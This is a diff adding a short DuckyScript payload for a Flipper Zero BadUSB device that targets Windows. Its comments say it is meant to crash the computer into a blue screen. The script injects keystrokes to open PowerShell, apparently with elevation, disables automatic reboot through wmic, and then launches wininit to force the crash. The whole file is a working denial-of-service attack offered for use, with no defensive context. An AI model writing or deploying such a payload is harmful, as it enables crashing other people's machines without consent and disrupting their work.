@@ -1,0 +1,18 @@
+
+REM This Script Was Made By RE3Z
+REM WARNING! This Script Crashes Your Computer Forcing It To BSOD
+REM This Script Is Made For The Flipper Zero To Hack Windows OS
+
+DELAY 1000
+GUI r
+STRING powershell
+ENTER
+CTRL
+SHIFT
+ENTER
+DELAY 1200
+STRING wmic RecoverOS set AutoReboot = False
+ENTER
+DELAY 1000
+STRING wininit
+ENTER
